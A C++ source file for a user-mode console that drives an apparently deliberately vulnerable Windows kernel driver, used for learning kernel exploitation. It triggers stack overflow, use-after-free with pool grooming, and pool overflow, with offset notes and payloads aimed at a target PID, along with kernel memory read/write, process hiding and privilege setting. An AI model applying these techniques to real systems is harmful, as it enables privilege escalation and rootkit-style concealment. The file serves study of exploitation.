#include "mem_attacker_console.h"

namespace mem_attacker_console {

	/*  */
	bool MemAttacker::read_1byte(ULONG64 addr) {

		ADDR_BYTE addr_byte = { addr, 0 };

		bool b_res =
			scm_manager.send_ctrl_code(MEM_ATTACKER_READ_1_BYTE, (LPVOID)&addr_byte, sizeof ADDR_BYTE, NULL, 0, 0);

		if (b_res) {
			cout << "[" << std::hex << addr_byte.addr << "]= 0x" << std::hex << (int)addr_byte.value << endl;
		}

		return b_res;
	}

	/*  */
	bool MemAttacker::write_1byte(ULONG64 addr, char value) {

		ADDR_BYTE addr_byte = { addr, value };

		bool b_res =
			scm_manager.send_ctrl_code(MEM_ATTACKER_WRITE_1_BYTE, (LPVOID)&addr_byte, sizeof ADDR_BYTE, NULL, 0, 0);
		if (b_res) {
			cout << "[" << std::hex << addr_byte.addr << "]=" << std::hex << addr_byte.value << endl;
		}
		return b_res;
	}

	/*  */
	bool MemAttacker::write_8bytes(ULONG64 addr, ULONG64 value) {

		ADDR_8BYTES addr_byte = { addr, value };

		bool b_res =
			scm_manager.send_ctrl_code(MEM_ATTACKER_WRITE_8_BYTES, (LPVOID)&addr_byte, sizeof ADDR_8BYTES, NULL, 0, 0);

		return b_res;
	}

	/*  */
	bool MemAttacker::hide_proc(ULONG64 procId) {

		bool b_res =
			scm_manager.send_ctrl_code(MEM_ATTACKER_HIDE_PROCESS, (LPVOID)&procId, sizeof ULONG64, NULL, 0, 0);

		return b_res;
	}

	/*  */
	bool MemAttacker::set_priv(ULONG64 procId) {

		bool b_res =
			scm_manager.send_ctrl_code(MEM_ATTACKER_SET_PRIVS, (LPVOID)&procId, sizeof ULONG64, NULL, 0, 0);

		return b_res;
	}

	


	bool MemAttacker::run_simple_stack_overflow(DWORD bufferSz) {
		auto b_res = false;
		byte* input_buffer = (byte*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferSz);
		if (input_buffer) {
			const char byte_sym = /*0x49*/ (int)'I';

			memset(input_buffer, byte_sym, bufferSz);

			/*
			E.g.
			bufferSize = 0 --> no crash
			bufferSize = 1 --> no crash
			...
			bufferSize = 2063 --> no crash
			bufferSize = 2064 --> no crash
			bufferSize = 2065 --> crash

			RIP = 2064 + 8
			RSP = 2064 + 8 + 8
			*/

			b_res = scm_manager.send_ctrl_code(MEM_ATTACKER_SIMPLE_STACK_OVERFLOW, input_buffer, bufferSz, NULL, 0, 0);
			HeapFree(GetProcessHeap(), 0, input_buffer);
		}
		return b_res;
	}

	bool MemAttacker::run_stack_overflow_with_payload(const DWORD targetPid) {
		auto b_res = false;
		{ // PayloadStackOverFlow constructor
			payload_stack_overflow::PayloadStackOverFlow my_payload(targetPid);
			if (my_payload.init()) {
				b_res = scm_manager.send_ctrl_code(MEM_ATTACKER_SIMPLE_STACK_OVERFLOW,
					my_payload._buffer, my_payload._bufferSz, NULL, 0, 0);

			}
		} // PayloadStackOverFlow destructor
		return b_res;
	}

	bool MemAttacker::run_use_after_free() {
		auto b_res = false;
		for (int i = 1; i < 100; i++, Sleep((rand() % 10))) {
			b_res = scm_manager.send_ctrl_code(MEM_ATTACKER_UAF_ALLOCATE_OBJECT, NULL, 0, NULL, 0, 0);

			b_res = scm_manager.send_ctrl_code(MEM_ATTACKER_UAF_FREE_OBJECT, NULL, 0, NULL, 0, 0);

			print_messages::print_mes(TEXT("user mode attempt # %d "), i);

			b_res = scm_manager.send_ctrl_code(MEM_ATTACKER_UAF_USE_OBJECT, NULL, 0, NULL, 0, 0);

		}
		return b_res;
	}

	bool MemAttacker::run_use_after_free_with_payload(const DWORD targetPid)
	{
		auto b_res = false;
		{ // PayloadUseAfterFree constructor
			payload_use_after_free::PayloadUseAfterFree payload_uaf(targetPid);
			if (payload_uaf.init() &&
				payload_uaf.prepare_memory() &&
				scm_manager.send_ctrl_code(MEM_ATTACKER_UAF_ALLOCATE_OBJECT, NULL, 0, NULL, 0, 0) &&
				scm_manager.send_ctrl_code(MEM_ATTACKER_UAF_FREE_OBJECT, NULL, 0, NULL, 0, 0) &&
				payload_uaf.prepare_payload()) {
				for (unsigned int i = 0; i < payload_uaf.poolGroomSz / 2; i++) {
					b_res = scm_manager.send_ctrl_code(
						MEM_ATTACKER_UAF_ALLOCATE_FAKE, payload_uaf._buffer, 0, NULL, 0, 0);
				}
				b_res = scm_manager.send_ctrl_code(MEM_ATTACKER_UAF_USE_OBJECT, NULL, 0, NULL, 0, 0);
			}
		} // PayloadUseAfterFree destructor
		return b_res;
	}

	void MemAttacker::test_pool_allocations() {
		__debugbreak();

		print_messages::print_mes(TEXT("NonPaged Pool objects: "));
		for (int i = 0; i < 30; i++) {
			HANDLE event = CreateEvent(NULL, false, false, TEXT("TEST"));
			print_messages::print_mes(TEXT("\tEvent object: 0x%x "), (unsigned int)event);
			int tmp = 0;
			cin >> tmp; tmp++;
		}
		__debugbreak();
		// 		HANDLE semaphore = CreateSemaphore(NULL, 0, 1, TEXT(""));
		// 		printf("\tSemaphore object: 0x%x\r\n", semaphore);
		// 		HANDLE mutex = CreateMutex(NULL, false, TEXT(""));
		// 		printf("\tMutex object: 0x%x\r\n", mutex);

		__debugbreak();
	}

	bool MemAttacker::run_pool_overflow(DWORD bufferSz)
	{
		/*
		Windows Kernel Pool Spraying:
		RUS- https://habrahabr.ru/company/pt/blog/172719/
		ENG- https://media.blackhat.com/eu-13/briefings/Liu/bh-eu-13-liu-advanced-heap-slides.pdf

		*/
		auto b_res = false;
		byte* input_buffer = (byte*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferSz);
		if (input_buffer) {
			const char byte_sym = /*0x49*/ (int)'I';

			memset(input_buffer, byte_sym, bufferSz);

			/*
			E.g.
			bufferSize = 0 --> no crash
			bufferSize = 1 --> no crash
			...
			bufferSize = 2063 --> no crash
			bufferSize = 2064 --> no crash
			bufferSize = 2065 --> crash

			RIP = 2064 + 8
			RSP = 2064 + 8 + 8
			*/

			b_res = scm_manager.send_ctrl_code(MEM_ATTACKER_SIMPLE_POOL_OVERFLOW, input_buffer, bufferSz, NULL, 0, 0);
			HeapFree(GetProcessHeap(), 0, input_buffer);
		}
		return b_res;
	}

}